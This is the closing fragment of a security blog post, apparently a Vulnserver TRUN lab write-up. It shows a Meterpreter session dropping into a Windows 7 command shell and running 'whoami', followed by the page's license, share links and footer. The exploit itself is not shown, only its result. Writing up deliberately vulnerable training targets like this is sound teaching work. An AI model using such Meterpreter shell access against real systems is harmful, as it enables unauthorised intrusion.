</pre><td class="rouge-code"><pre>meterpreter <span class="o">&gt;</span> shell
Process 3720 created.
Channel 2 created.
Microsoft Windows <span class="o">[</span>Version 6.1.7601]
Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\I</span>EUser<span class="se">\D</span>esktop<span class="se">\v</span>ulnserver&gt;whoami
<span class="nb">whoami
</span>iewin7<span class="se">\i</span>euser

C:<span class="se">\U</span>sers<span class="se">\I</span>EUser<span class="se">\D</span>esktop<span class="se">\v</span>ulnserver&gt;    

</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vulnserver/'>Vulnserver</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Vulnserver-Trun - Mojodojo's Blog&url=https://c2.quest/archived/2020-01-30-trun.html" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Vulnserver-Trun - Mojodojo's Blog&u=https://c2.quest/archived/2020-01-30-trun.html" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Vulnserver-Trun - Mojodojo's Blog&url=https://c2.quest/archived/2020-01-30-trun.html" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/@Mojodojo_101">Mojodojo101</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://c2.quest{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
